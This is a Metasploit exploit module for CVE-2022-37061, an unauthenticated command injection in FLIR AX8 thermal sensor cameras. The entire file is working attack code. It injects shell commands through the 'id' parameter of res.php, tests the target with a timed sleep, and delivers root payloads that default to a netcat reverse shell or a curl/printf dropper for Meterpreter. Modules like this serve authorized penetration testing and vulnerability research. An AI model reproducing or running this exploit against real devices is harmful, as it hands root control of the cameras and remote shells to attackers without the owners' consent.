##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/stopwatch'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Flir AX8 unauthenticated RCE',
        'Description' => %q{
          All FLIR AX8 thermal sensor cameras version up to and including 1.46.16 are vulnerable to Remote Command Injection.
          This can be exploited to inject and execute arbitrary shell commands as the root user through the id HTTP POST parameter
          in the res.php endpoint.

          This module uses the vulnerability to upload and execute payloads gaining root privileges.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Thomas Knudsen (https://www.linkedin.com/in/thomasjknudsen)', # Security researcher
          'Samy Younsi (https://www.linkedin.com/in/samy-younsi)', # Security researcher
          'h00die-gr3y' # metasploit module
        ],
        'References' => [
          ['CVE', '2022-37061'],
          ['PACKETSTORM', '168114'],
          ['URL', 'https://attackerkb.com/topics/UAZaDsQBfx/cve-2022-37061'],
        ],
        'DisclosureDate' => '2022-08-19',
        'Platform' => ['unix','linux'],
        'Arch' => [ARCH_CMD, ARCH_ARMLE],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_ARMLE],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'curl', 'printf' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def execute_command(cmd, _opts = {})
    return send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',
      'uri' => normalize_uri(target_uri.path, 'res.php'),
      'vars_post' => {
        'action' => "alarm",
        'id' => "2;#{cmd}"
      }
    })
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    return Exploit::CheckCode::Unknown("Communication error occurred: #{e.message}")
  end

  # Checking if the target is vulnerable by executing a randomized sleep to test the remote code execution
  def check
    print_status("Checking if #{peer} can be exploited!")
    sleep_time = rand(5..10)
    print_status("Performing command injection test issuing a sleep command of #{sleep_time} seconds.")
    res, elapsed_time = Rex::Stopwatch.elapsed_time do
      execute_command("sleep #{sleep_time}")
    end

    return Exploit::CheckCode::Unknown('No response received from the target!') unless res

    print_status("Elapsed time: #{elapsed_time} seconds.")
    return CheckCode::Safe('Failed to test command injection.') unless elapsed_time >= sleep_time

    CheckCode::Vulnerable('Successfully tested command injection.')
  end

  def exploit
    case target['Type']
    when :unix_cmd
      print_status("Executing #{target.name} with #{payload.encoded}")
      execute_command(payload.encoded)
    when :linux_dropper
      print_status("Executing #{target.name}")
      execute_cmdstager
    end
  end
end
